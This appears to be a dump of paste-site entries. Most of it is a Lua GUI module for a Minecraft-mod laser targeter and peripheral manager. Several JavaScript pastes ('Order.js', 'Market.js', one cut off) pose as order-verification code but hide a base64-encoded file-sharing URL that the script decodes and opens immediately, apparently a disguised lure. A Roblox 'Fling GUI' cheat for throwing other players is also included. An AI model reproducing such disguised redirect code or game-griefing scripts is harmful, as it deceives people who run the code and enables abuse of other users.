  t1b4.refListT = t1ListT
  t1b4.refTargeter = targeter1
  t1b4.refTargetLabel = t1l3
  t1b4.refDrawable = refTabWidget
  t1b4.onClick = function(self)
    if not self.refListT or not self.refTargeter
        or not self.refDrawable or not self.refTargetLabel then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""t1b4"")
      return
    end
    Widgets.Logger.log(""ERROR"",
        ""selected=""..tostring(self.refListT.selected), ""t1b4"")
    if self.refListT.selected then
      local ts = self.refListT.dataArray[self.refListT.selected]
      self.refTargeter.SetTarget(ts[1], ts[2], ts[3])
      self.refTargetLabel.text = string.format(""%7s,%4s,%7s"",
          targeter1.GetTarget())
      self.refDrawable:draw()
    end
  end
  t1b5 = Widgets.ButtonM:new()
  t1b5:init(refTabWidget, 45, 17, 6, 1, true)
  t1b5.text = ""ABORT ""
  t1b5.textColor = colors.red
  t1b5.refTargeter = targeter1
  t1b5.onClick = function(self)
    if not self.refTargeter then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""FireBn"")
      return
    end
    self.refTargeter.isAborted = true
  end

  return t1ListT, targeter1.TargeterCoroutine
end


-------------------------------------------------------------------
-- Automatic targeter tab for laser cameras
-- fills 18x51 tab with widgets for automatic targeter
-- Input:
-- targeterId (1, 2, ...) - should be unique
-- refTabWidget - empty 18x51 tab
-- refTextInput - InputLine widget reference
-- refTargetArray - target array reference
-- refTargetArrDrawRow - function drawing target array elements
-- Output:
-- t1ListT - target list ref (for updates)
-- TargeterCoroutine
local function CreateTargeterAutoCamTab(targeterId, refTabWidget,
  refTextInput, refTargetArray, refTargetArrDrawRow)
local targeter1 = CreateTargeterAutoCam(targeterId, Widgets.Logger)
local t1l1 = Widgets.Label:new()
t1l1:init(refTabWidget, 1, 1, 13, 1, true)
t1l1.text = ""Lasers:""
local t1ListLg = Widgets.ListView:new()
t1ListLg:init(refTabWidget, 1, 2, 10, 16, true)
t1ListLg.isSelectable = true
t1ListLg.isMultiSelectable = true
t1ListLg.dataArray = targeter1.groups
t1ListLg.drawRow = targeter1.DisplayGroup
t1ListLg.onSelect = targeter1.OnGroupSelect
table.insert(PeripheralManager.widgetsToUpdate, t1ListLg)
local t1l2 = Widgets.Label:new()
t1l2:init(refTabWidget, 12, 1, 7, 1, true)
t1l2.text = ""Target:""
local t1l3 = Widgets.Label:new()
t1l3:init(refTabWidget, 12, 2, 20, 1, true)
t1l3.bgColor = colors.white
t1l3.text = string.format(""%7s,%4s,%7s"", targeter1.GetTarget())
local t1b1 = Widgets.Button:new()
t1b1:init(refTabWidget, 32, 2, 5, 1, true)
t1b1.caption = ""ENTER""
t1b1.refTextInput = refTextInput
t1b1.refTargeter = targeter1
t1b1.refDrawable = refTabWidget
t1b1.onClick = function(self)
if not self.refTextInput or not self.refTargeter
    or not self.refDrawable then
  Widgets.Logger.log(""ERROR"", ""ref not set"", ""TargetSetBn"")
  return
end
local str = self.refTextInput:processText(""x, y, z: "", """")
local tab = textutils.unserialize(""{""..str..""}"")
if tab == nil then return end
local x, y, z = table.unpack(tab)
if x and type(x) == ""number"" and y and type(y) == ""number""
  and z and type(z) == ""number"" then
    self.refTargeter.SetTarget(x, y, z)
    t1l3.text = string.format(""%7s,%4s,%7s"", self.refTargeter.GetTarget())
    self.refDrawable:draw()
  else
    Widgets.Logger.log(""DEBUG"", string.format(""x,y,z=%s,%s,%s"",
      x, y, z), ""TargetSetBn"")
  end
end
local t1b2 = Widgets.ButtonT:new()
t1b2:init(refTabWidget, 40, 4, 7, 1, true)
t1b2.caption = "" BOOST""
t1b2.fn = targeter1.ModeBoost
local t1l6 = Widgets.Label:new()
t1l6:init(refTabWidget, 40, 5, 7, 1, true)
t1l6.text = ""Repeats:""
local t1b6 = Widgets.Button:new()
t1b6:init(refTabWidget, 40, 6, 7, 1, true)
t1b6.caption = tostring(targeter1.repeats)
t1b6.refTargeter = targeter1
t1b6.refTextInput = refTextInput
t1b6.refDrawable = refTabWidget
t1b6.onClick = function(self)
if not self.refTextInput or not self.refTargeter
    or not self.refDrawable then
  Widgets.Logger.log(""ERROR"", ""ref not set"", ""RepeatsBn"")
  return
end
local val = tonumber(self.refTextInput:processText(
  ""Number of repeats: "", tostring(self.refTargeter.repeats)))
if not val then return end
val = math.floor(math.abs(val))
if val <= 0 then return end
self.refTargeter.repeats = val
self.caption = tostring(val)
self.refDrawable:draw()
end
local t1l7 = Widgets.Label:new()
t1l7:init(refTabWidget, 40, 7, 7, 1, true)
t1l7.text = ""Delay:""
local t1b7 = Widgets.Button:new()
t1b7:init(refTabWidget, 40, 8, 7, 1, true)
t1b7.caption = tostring(targeter1.repeatDelay.."" s"")
t1b7.refTargeter = targeter1
t1b7.refTextInput = refTextInput
t1b7.refDrawable = refTabWidget
t1b7.onClick = function(self)
if not self.refTextInput or not self.refTargeter
    or not self.refDrawable then
  Widgets.Logger.log(""ERROR"", ""ref not set"", ""RepeatDelayBn"")
  return
end
local val = tonumber(self.refTextInput:processText(
  ""Seconds between repeats: "",
  tostring(self.refTargeter.repeatDelay)))
if not val then return end
val = math.floor(math.abs(val)*20)/20
if val < 0.05 then return end
self.refTargeter.repeatDelay = val
self.caption = tostring(val).."" s""
self.refDrawable:draw()
end
local t1b3 = Widgets.ButtonM:new()
t1b3:init(refTabWidget, 45, 14, 6, 2, true)
t1b3.text = "" \n FIRE \n""
t1b3.refTargeter = targeter1
t1b3.onClick = function(self)
if not self.refTargeter then
  Widgets.Logger.log(""ERROR"", ""ref not set"", ""FireBn"")
  return
end
self.refTargeter.isAborted = false
if not self.refTargeter.isFiring then
  os.queueEvent(""fire"", targeterId)
end
end
local t1l4 = Widgets.Label:new()
t1l4:init(refTabWidget, 38, 1, 7, 1, true)
t1l4.text = ""Status:""
local t1LStatus = Widgets.Label:new()
t1LStatus:init(refTabWidget, 38, 2, 10, 1, true)
t1LStatus.bgColor = colors.blue
targeter1.SetStatusWidget(t1LStatus)
local t1l5 = Widgets.Label:new()
t1l5:init(refTabWidget, 12, 3, 13, 1, true)
t1l5.text = ""Target list:""
-- target list viewer/selector
local t1ListT = Widgets.ListView:new()
t1ListT:init(refTabWidget, 12, 4, 25, 14, true)
t1ListT.isSelectable = true
t1ListT.dataArray = refTargetArray
t1ListT.drawRow = refTargetArrDrawRow
table.insert(ttB1.refDrawableArr, t1ListT)
local t1b4 = Widgets.Button:new()
t1b4:init(refTabWidget, 27, 3, 3, 1, true)
t1b4.caption = "" \30 ""
t1b4.refListT = t1ListT
t1b4.refTargeter = targeter1
t1b4.refTargetLabel = t1l3
t1b4.refDrawable = refTabWidget
t1b4.onClick = function(self)
if not self.refListT or not self.refTargeter
    or not self.refDrawable or not self.refTargetLabel then
  Widgets.Logger.log(""ERROR"", ""ref not set"", ""t1b4"")
  return
end
Widgets.Logger.log(""ERROR"",
    ""selected=""..tostring(self.refListT.selected), ""t1b4"")
if self.refListT.selected then
  local ts = self.refListT.dataArray[self.refListT.selected]
  self.refTargeter.SetTarget(ts[1], ts[2], ts[3])
  self.refTargetLabel.text = string.format(""%7s,%4s,%7s"",
      targeter1.GetTarget())
  self.refDrawable:draw()
end
end
t1b5 = Widgets.ButtonM:new()
t1b5:init(refTabWidget, 45, 17, 6, 1, true)
t1b5.text = ""ABORT ""
t1b5.textColor = colors.red
t1b5.refTargeter = targeter1
t1b5.onClick = function(self)
if not self.refTargeter then
  Widgets.Logger.log(""ERROR"", ""ref not set"", ""FireBn"")
  return
end
self.refTargeter.isAborted = true
end

return t1ListT, targeter1.TargeterCoroutine
end


-------------------------------------------------------------------
-- Peripheral manager tab
-- fills 18x51 tab with a GUI to manage all connected peripherals
-- uses existing PeripheralManager from this file
-- Input:
-- refTabWidget - empty 18x51 tab
-- refTextInput - InputLine widget reference
local function CreatePeripheralManagerTab(refTabWidget,
  refTextInput)
  local tpml1 = Widgets.Label:new()
  tpml1:init(refTabWidget, 1, 1, 12, 1, true)
  tpml1.text = ""Peripherals:""
  -- List of every connected peripheral side/name
  local tpmList1 = Widgets.ListView:new()
  tpmList1:init(refTabWidget, 1, 2, 20, 15, true)
  tpmList1.isSelectable = true
  tpmList1.includeCfg = function() return true end
  tpmList1.refPerManTable = PeripheralManager.peripherals
  tpmList1.onSelect = function(self)
    if not self.refMethods or not self.refPerData then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""tpmList1"")
      return
    end
    self.refMethods.dataArray = nil
    if self.selected and self.dataArray then
      local perSide = self.dataArray[self.selected]
      if peripheral.isPresent(perSide) then
        self.refMethods.dataArray = peripheral.getMethods(perSide)
      end
    end
    self:drawRefs()
  end
  tpmList1.updateData = function(self)
    self.dataArray = peripheral.getNames()
    if self.includeCfg() and self.refPerManTable then
      for k, _ in pairs(self.refPerManTable) do
        if not peripheral.isPresent(k) then
          table.insert(self.dataArray, k)
        end
      end
    end
    table.sort(self.dataArray)
  end
  local tpmList1fn = function(newVal)
    local value = true --default
    return function(newVal)
      if newVal==nil then return value end
      if newVal==true then value = true end
      if newVal==false then value = false end
    end
  end
  tpmList1.includeCfg = tpmList1fn()
  tpmList1.drawRow = function(self, index, length, isSelected)
    local bgColor = self.bgColor
    local textColor = self.textColor
    local val = self.dataArray[index] --peripheral name
    local shortName = val:gsub(""warpdrive"", ""wd"", 1) --shorten prefix
    if shortName:len() > 20 then  --we're limited to 20 chars
      local numStart, numEnd = shortName:find(""_%d+"", 3)
      if numStart and numEnd then
        shortName = shortName:sub(1, 20-(numEnd-numStart+1)) .. ""~""
          .. shortName:sub(numStart+1, numEnd)
      end
    end
    if self.refPerManTable and val
      and (not self.refPerManTable[val]
      or not self.refPerManTable[val].callable) then
      textColor = colors.gray
      end
    if isSelected then
      bgColor = self.bgColorSelected
    end
    local rowStr = string.format(""%-""..length.."".""..length..""s"",
      shortName)
    self.window.blit(rowStr,
        colorToBlit(textColor):rep(#rowStr),
        colorToBlit(bgColor):rep(#rowStr))--]]
  end
  -- Button to refresh the list of peripherals
  local tpmb1 = Widgets.Button:new()
  tpmb1:init(refTabWidget, 1, 17, 7, 1, true)
  tpmb1.caption = ""REFRESH""
  tpmb1.refListPeripherals = tpmList1
  tpmb1.onClick = function(self)
    if not self.refListPeripherals then
      Widgets.Logger.log(""ERROR"", ""refListPeripherals not set"", ""tpmb1"")
      return
    end
    self.refListPeripherals:draw()
  end
  -- Button to include/exclude disconnected peripherals from .cfg
  local tpmBT1 = Widgets.ButtonT:new()
  tpmBT1:init(refTabWidget, 9, 17, 5, 1, true)
  tpmBT1.caption = "".cfg""
  tpmBT1.refListPeripherals = tpmList1
  tpmBT1.fn = tpmList1.includeCfg


  -- Methods and data tabs
  local tpmTabs1 = Widgets.Tabs:new()
  tpmTabs1:init(refTabWidget, 22, 1, 31, 49, true)
  -- Methods tab
  local tpmTab1 = tpmTabs1:addTab("" Methods "")
  -- List of all methods of selected peripheral
  local tpmList2 = Widgets.ListView:new()
  tpmList2:init(tpmTab1, 1, 2, 20, 8, true)
  tpmList2.isSelectable = true
  tpmList1.refMethods = tpmList2
  table.insert(tpmList1.refsDraw, tpmList2)
  -- Function to perform all the checks and make the call
  local tpmBtnCallFunc = function(self, askParams)
    if not self.refMethods or not self.refListPeripherals
        or not self.refLabelResult then
      Widgets.Logger.log(""ERROR"", ""reference not set"", ""tpmBtnCallFunc"")
      return
    end
    self.refLabelResult.text = """"
    local selectedIndexMethod = self.refMethods.selected
    local selectedIndexName = self.refListPeripherals.selected
    if selectedIndexMethod and selectedIndexName
        and self.refMethods.dataArray
        and self.refListPeripherals.dataArray then
      local selectedMethod = self.refMethods.dataArray[selectedIndexMethod]
      local selectedName = self.refListPeripherals.dataArray[selectedIndexName]
      if selectedMethod and selectedName then
        --user params
        local parTable = {}
        if askParams then
          if not self.refTextInput then
            Widgets.Logger.log(""ERROR"", ""refTextInput not set"", ""tpmBtnCallFunc"")
          else
            local parStr = self.refTextInput:processText(""Params: "", """")
            parTable = textutils.unserialize(""{""..parStr..""}"")
            if parTable == nil then return end
          end
        end
        --call method + params
        local res = table.pack(pcall(function()
          return peripheral.call(selectedName, selectedMethod,
            table.unpack(parTable)) end))
        --show what has been called
        self.refLabelResult.text = selectedName.."".""..selectedMethod..""(""
        if (parTable) then
          for i_p = 1, #parTable do
            self.refLabelResult.text = self.refLabelResult.text..tostring(parTable[i_p])
            if i_p < #parTable then
              self.refLabelResult.text = self.refLabelResult.text.."", ""
            end
          end
        end
        self.refLabelResult.text = self.refLabelResult.text.."")\n""
        --process call results
        res.n = nil
        if res[1] then
          self.refLabelResult.textColor = colors.white
          for i_r = 2, #res do
            self.refLabelResult.text = self.refLabelResult.text..tostring(res[i_r])
            if i_r < #res then
              self.refLabelResult.text = self.refLabelResult.text.."", ""
            end
          end
        else
          self.refLabelResult.textColor = colors.red
          self.refLabelResult.text = self.refLabelResult.text..tostring(res[2])
        end
      end
    end
    self.refLabelResult:draw()
  end
  -- Button to call the selected method
  local tpmB2 = Widgets.Button:new()
  tpmB2:init(tpmTab1, 23, 2, 6, 1, true)
  tpmB2.caption = "" CALL ""
  tpmB2.refMethods = tpmList2
  tpmB2.refListPeripherals = tpmList1
  tpmB2.onClick = function(self)
    tpmBtnCallFunc(self)
  end
  -- Button to call the selected method with user params
  local tpmB3 = Widgets.ButtonM:new()
  tpmB3:init(tpmTab1, 23, 4, 6, 3, true)
  tpmB3.text = "" CALL \n WITH \nPARAMS""
  tpmB3.refMethods = tpmList2
  tpmB3.refListPeripherals = tpmList1
  tpmB3.refTextInput = refTextInput
  tpmB3.onClick = function(self)
    tpmBtnCallFunc(self, true)
  end
  -- Label to display the results of the call
  local tpmL2 = Widgets.Label:new()
  tpmL2:init(tpmTab1, 1, 11, 29, 5, true)
  tpmL2.bgColor = colors.gray
  tpmL2.text = ""Method call results\nshould appear here""
  tpmB2.refLabelResult = tpmL2
  tpmB3.refLabelResult = tpmL2
  -- Data tab
  local tpmTab2 = tpmTabs1:addTab("" Data "")
  local tpmL3 = Widgets.Label:new()
  tpmL3:init(tpmTab2, 1, 1, 10, 1, true)
  tpmL3.text = ""In memory:""
  local tpmListPerData = Widgets.ListView:new()
  tpmListPerData:init(tpmTab2, 1, 2, 29, 14, true)
  tpmListPerData.refPerManTable = PeripheralManager.peripherals
  tpmListPerData.refListPeripherals = tpmList1
  tpmList1.refPerData = tpmListPerData
  table.insert(tpmList1.refsDraw, tpmListPerData)
  tpmListPerData.updateData = function(self)
    self.dataArray = {}
    if not self.refPerManTable or not self.refListPeripherals then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""tpmListPerData"")
      return
    end
    local sel = self.refListPeripherals.selected
    local da = self.refListPeripherals.dataArray
    if not sel or not da then return end
    local selName = da[sel]
    if not selName or not self.refPerManTable[selName] then return end
    local res = ConvertTableToArrayStrings(
      self.refPerManTable[selName])
    if res then self.dataArray = res end
  end
  table.insert(PeripheralManager.widgetsToUpdate, tpmListPerData)
  -- .cfg tab
  local tpmTab3 = tpmTabs1:addTab("".cfg "")
  local tpmL4 = Widgets.Label:new()
  tpmL4:init(tpmTab3, 1, 1, 10, 1, true)
  tpmL4.text = ""On disk:""
  local tpmListPerCfg = Widgets.ListView:new()
  tpmListPerCfg:init(tpmTab3, 1, 2, 30, 14, true)
  tpmListPerCfg.refListPeripherals = tpmList1
  tpmListPerCfg.isSelectable = true
  table.insert(tpmList1.refsDraw, tpmListPerCfg)
  tpmListPerCfg.getSelPeripheral = function(self)
    if not self.refListPeripherals then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""tpmListPerCfg"")
      return
    end
    local sel = self.refListPeripherals.selected
    local da = self.refListPeripherals.dataArray
    if not sel or not da then return end
    self.selectedPeripheral = da[sel]
  end
  tpmListPerCfg.updateData = function(self)
    self.dataArray = {}
    self:getSelPeripheral()
    if not self.selectedPeripheral or not self.cfgTable then
      return
    end
    if self.cfgTable[self.selectedPeripheral] then
      local arr, ind = ConvertTableToArraySerialize(
        self.cfgTable[self.selectedPeripheral])
      if arr then self.dataArray = arr else return end
      if ind then self.dataInd = ind else return end
    end
  end
  --Button to reload .cfg file to memory for edit
  local tpmB4 = Widgets.Button:new()
  tpmB4:init(tpmTab3, 19, 16, 6, 1, true)
  tpmB4.caption = ""RELOAD""
  tpmB4.refList = tpmListPerCfg
  tpmB4.refTextInput = refTextInput
  tpmB4.onClick = function(self)
    if not self.refList or not self.refTextInput then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""RELOAD"")
      return
    end
    self.refList.cfgTable = {}
    if not PeripheralManager.ReadPeripheralTable(
        self.refList.cfgTable) then
      self.refList.cfgTable = nil
      refTextInput:showMessage(""[""..os.date(""%T"")
        ..""] Failed to load config"")
      return
    end
    refTextInput:showMessage(""[""..os.date(""%T"")
        ..""] Config loaded"")
    self.refList:draw()
  end
  -- Button to write new .cfg from memory (if there's a table in there)
  local tpmB5 = Widgets.Button:new()
  tpmB5:init(tpmTab3, 26, 16, 5, 1, true)
  tpmB5.caption = ""WRITE""
  tpmB5.refList = tpmListPerCfg
  tpmB5.refTextInput = refTextInput
  tpmB5.onClick = function(self)
    if not self.refList or not tpmB5.refTextInput then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""WRITE"")
      return
    end
    if not self.refList.cfgTable
        or type(self.refList.cfgTable)~=""table"" then
      Widgets.Logger.log(""ERROR"", ""broken cfgTable"", ""WRITE"")
      refTextInput:showMessage(""[""..os.date(""%T"")
        ..""] In-mem config is broken"")
      return
    end
    if not PeripheralManager.WritePeripheralTable(
        self.refList.cfgTable) then
      refTextInput:showMessage(""[""..os.date(""%T"")
        ..""] Failed to write config"")
      return
    end
    refTextInput:showMessage(""[""..os.date(""%T"")..""] Config written"")
  end
  -- Button to add new key=true for the selected peripheral
  local tpmB6 = Widgets.Button:new()
  tpmB6:init(tpmTab3, 1, 16, 3, 1, true)
  tpmB6.caption = ""ADD""
  tpmB6.refList = tpmListPerCfg
  tpmB6.refTextInput = refTextInput
  tpmB6.onClick = function(self)
    if not self.refList or not self.refTextInput then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""ADD"")
      return
    end
    if not self.refList.cfgTable then return end
    local selName = self.refList.selectedPeripheral
    if not selName then return end
    local key = textutils.unserialize(self.refTextInput:processText(
        ""New key: "", """"))
    if key == nil then
      Widgets.Logger.log(""DEBUG"", ""key == nil"", ""ADD"")
      return end
    if not self.refList.cfgTable[selName] then
      self.refList.cfgTable[selName] = {}
    end
    local cfgSelected = self.refList.cfgTable[selName]
    cfgSelected[key] = true
    self.refList:draw()
  end
  -- Button to remove selected kv pair for the selected peripheral
  local tpmB7 = Widgets.Button:new()
  tpmB7:init(tpmTab3, 10, 16, 3, 1, true)
  tpmB7.caption = ""REM""
  tpmB7.refList = tpmListPerCfg
  tpmB7.onClick = function(self)
    if not self.refList then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""REM"")
      return
    end
    if not self.refList.cfgTable then return end
    local cfgTable = self.refList.cfgTable
    if not self.refList.selectedPeripheral then return end
    local selectedPeripheral = self.refList.selectedPeripheral
    if not self.refList.selected then return end
    local selIndex = self.refList.selected
    if not self.refList.dataInd then return end
    local di = self.refList.dataInd
    if not di[selIndex] then return end
    if not cfgTable[selectedPeripheral] then return end
    cfgTable[selectedPeripheral][di [selIndex] ] = nil
    self.refList:draw()
  end
  -- Button to edit value for the selected kv pair
  local tpmB8 = Widgets.Button:new()
  tpmB8:init(tpmTab3, 5, 16, 4, 1, true)
  tpmB8.caption = ""EDIT""
  tpmB8.refList = tpmListPerCfg
  tpmB8.refTextInput = refTextInput
  tpmB8.onClick = function(self)
    if not self.refList or not self.refTextInput then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""EDIT"")
      return
    end
    if not self.refList.cfgTable then return end
    local cfgTable = self.refList.cfgTable
    if not self.refList.selectedPeripheral then return end
    local selectedPeripheral = self.refList.selectedPeripheral
    if not self.refList.selected then return end
    local selIndex = self.refList.selected
    if not self.refList.dataInd then return end
    local di = self.refList.dataInd
    if not di[selIndex] then return end
    if not cfgTable[selectedPeripheral] then return end
    local curVal = cfgTable[selectedPeripheral][di [selIndex] ]
    curVal = string.gsub(textutils.serialize(curVal), ""\n"", """")
    local str = self.refTextInput:processText(tostring(di[selIndex])
      .."": "", curVal)
    local val = textutils.unserialize(str)
    if val == nil then return end
    cfgTable[selectedPeripheral][di [selIndex] ] = val
    self.refList:draw()
  end
  -- Button to set default values for the selected peripheral
  local tpmB9 = Widgets.Button:new()
  tpmB9:init(tpmTab3, 14, 16, 1, 1, true)
  tpmB9.caption = ""D""
  tpmB9.refList = tpmListPerCfg
  tpmB9.onClick = function(self)
    if not self.refList then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""D"")
      return
    end
    if not self.refList.cfgTable then return end
    local selName = self.refList.selectedPeripheral
    if not selName then return end
    local t = peripheral.getType(selName)
    if not t then return end
    self.refList.cfgTable[selName] =
      PeripheralManager.GetDefaultParamsByType(t)
    self.refList:draw()
  end

  tpmTabs1:selectTab("" Data "")
end



local ExportedUtils =
{
	ReadTableFromFile = ReadTableFromFile,
  WriteTableToFile = WriteTableToFile,
	PeripheralManager = PeripheralManager,
  CreateTargeter = CreateTargeter,
  CreateTargeterTab = CreateTargeterTab,
  CreateTargeterAutoCamTab = CreateTargeterAutoCamTab,
  CreatePeripheralManagerTab = CreatePeripheralManagerTab,
  ColorToBlit = colorToBlit,
  ConvertTableToArrayStrings = ConvertTableToArrayStrings,
  ConvertTableToArraySerialize = ConvertTableToArraySerialize
}

return ExportedUtils
"
BCwiP6wv,Order.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 03:42:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51490/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2b5SzvCS,Sander's GUI,EpicGamerSander1345,Lua,Sunday 20th of April 2025 03:36:49 PM CDT,"local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local Title = Instance.new(""TextLabel"")
local TextBox = Instance.new(""TextBox"")
local FlingButton = Instance.new(""TextButton"")
local StopFlingButton = Instance.new(""TextButton"")
local Players = game:GetService(""Players"")

-- Ensure the script is a LocalScript and parent GUI to Player's PlayerGui
local player = Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")
ScreenGui.Parent = playerGui

-- Configure Frame
Frame.Size = UDim2.new(0, 350, 0, 250)
Frame.Position = UDim2.new(0.5, -175, 0.5, -125)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Configure Title
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Slightly lighter gray
Title.BorderSizePixel = 0
Title.Text = ""Fling GUI""
Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = Frame

-- Configure TextBox
TextBox.Size = UDim2.new(0.9, 0, 0, 40)
TextBox.Position = UDim2.new(0.05, 0, 0.2, 0)
TextBox.PlaceholderText = ""Enter part of username...""
TextBox.Text = """"
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40) -- Darker gray
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 16
TextBox.BorderSizePixel = 0
TextBox.Parent = Frame

-- Configure Fling Button
FlingButton.Size = UDim2.new(0.9, 0, 0, 40)
FlingButton.Position = UDim2.new(0.05, 0, 0.4, 0)
FlingButton.Text = ""Fling Target""
FlingButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180) -- Steel blue
FlingButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
FlingButton.Font = Enum.Font.GothamBold
FlingButton.TextSize = 16
FlingButton.BorderSizePixel = 0
FlingButton.Parent = Frame

-- Configure Stop Fling Button
StopFlingButton.Size = UDim2.new(0.9, 0, 0, 40)
StopFlingButton.Position = UDim2.new(0.05, 0, 0.6, 0)
StopFlingButton.Text = ""Stop Fling""
StopFlingButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60) -- Crimson red
StopFlingButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
StopFlingButton.Font = Enum.Font.GothamBold
StopFlingButton.TextSize = 16
StopFlingButton.BorderSizePixel = 0
StopFlingButton.Parent = Frame

-- Add rounded corners to elements
local function addUICorner(instance, radius)
    local uiCorner = Instance.new(""UICorner"")
    uiCorner.CornerRadius = UDim.new(0, radius)
    uiCorner.Parent = instance
end

addUICorner(Frame, 10)
addUICorner(Title, 10)
addUICorner(TextBox, 10)
addUICorner(FlingButton, 10)
addUICorner(StopFlingButton, 10)

-- Function to find player by partial name
local function findPlayerByName(partialName)
    for _, player in ipairs(Players:GetPlayers()) do
        if string.find(string.lower(player.Name), string.lower(partialName)) or 
           string.find(string.lower(player.DisplayName), string.lower(partialName)) then
            return player
        end
    end
    return nil
end

-- Function to update the textbox with the full name
local function updateTextBoxWithFullName(player)
    TextBox.Text = ""@"" .. player.DisplayName .. "", "" .. player.Name
end

-- Variables to manage fling state
local activeBodyVelocity = nil
local flingConnection = nil

-- Fling Button click event
FlingButton.MouseButton1Click:Connect(function()
    local partialName = TextBox.Text
    if partialName == """" then
        warn(""Please enter a username."")
        return
    end

    local targetPlayer = findPlayerByName(partialName)
    if not targetPlayer then
        warn(""Player not found."")
        return
    end

    updateTextBoxWithFullName(targetPlayer)

    local targetCharacter = targetPlayer.Character
    local localCharacter = Players.LocalPlayer.Character

    if targetCharacter and localCharacter then
        local targetTorso = targetCharacter:FindFirstChild(""HumanoidRootPart"")
        if not targetTorso then
            warn(""Target's HumanoidRootPart not found."")
            return
        end
        
        local localTorso = localCharacter:FindFirstChild(""HumanoidRootPart"")
        if targetTorso and localTorso then
            -- Attach local player to target's torso
            localTorso.CFrame = targetTorso.CFrame

            -- Apply extremely powerful and instant fling velocity to target
            local bodyVelocity = Instance.new(""BodyVelocity"")
            bodyVelocity.Velocity = Vector3.new(0, 1e8, 0) -- Extremely high upward velocity for an even more powerful fling
            bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
            bodyVelocity.Parent = targetTorso

            -- Store the BodyVelocity instance
            activeBodyVelocity = bodyVelocity

            -- Continuously update local player's position to stay inside the target's torso
            flingConnection = game:GetService(""RunService"").Heartbeat:Connect(function()
                if not targetTorso or not localTorso or not activeBodyVelocity then
                    if flingConnection then
                        flingConnection:Disconnect()
                        flingConnection = nil
                    end
                    return
                end
                localTorso.CFrame = targetTorso.CFrame
            end)
        end
    end
end)

-- Stop Fling Button click event
StopFlingButton.MouseButton1Click:Connect(function()
    if activeBodyVelocity then
        activeBodyVelocity:Destroy()
        activeBodyVelocity = nil
    end

    if flingConnection then
        flingConnection:Disconnect()
        flingConnection = nil
    end

    -- Reset player's health to respawn
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild(""Humanoid"")
        if humanoid then
            humanoid.Health = 0
        end
    end
end)
"
zRRJQpHJ,Market.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 03:26:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32327/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gBZ6SBjT,Untitled,hubertzoo90,JavaScript,Sunday 20th of April 2025 03:11:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89736/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
